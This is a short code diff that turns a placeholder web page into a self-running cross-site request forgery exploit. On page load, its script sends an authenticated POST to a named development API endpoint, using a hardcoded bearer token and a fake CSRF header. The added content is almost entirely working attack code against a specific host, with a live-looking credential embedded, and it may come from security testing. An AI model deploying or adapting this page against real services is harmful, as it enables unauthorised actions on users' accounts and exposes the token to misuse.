@@ -1,10 +1,22 @@
-Hello there
 <!DOCTYPE html>
 <html>
 <head>
-    <title>t</title>
+    <title>CSRF Exploit</title>
 </head>
 <body>
-
+    <script>
+        // Function to execute CSRF attack
+        function executeCSRF() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://devapi.horizonnut.com/Grower/DataByYear/181/2023", true);
+            xhr.setRequestHeader("Authorization", "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjIyMjg5NTIsImlzcyI6Imh0dHBzOi8vZGV2YXBpLmhvcml6b25udXQuY29tIiwiYXVkIjoiaHR0cHM6Ly9kZXZhcGkuaG9yaXpvbm51dC5jb20ifQ.x-FqXm_7zhKuV9PaQ8KejgZEg9c2xLLWe328oSScNx0");
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.setRequestHeader("X-Csrf-Token", "invalidtoken");
+            xhr.send();
+        }
+        // Execute the CSRF attack when the page loads
+        window.onload = executeCSRF;
+    </script>
+    <p>If you see this, a CSRF attack has been attempted.</p>
 </body>
 </html>
